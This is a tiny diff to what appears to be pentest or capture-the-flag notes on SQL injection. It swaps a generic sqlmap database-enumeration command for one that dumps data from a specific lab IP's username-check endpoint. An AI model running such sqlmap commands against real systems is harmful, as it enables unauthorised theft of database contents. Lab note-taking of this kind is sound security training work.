@@ -1,6 +1,6 @@
 Enumerating database
 ---------------------
-sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
+sqlmap -u "http://10.10.231.6/register/user-check?username=admin" -dump
 
 Dump all the available databases and tables
 -------------------------------------------
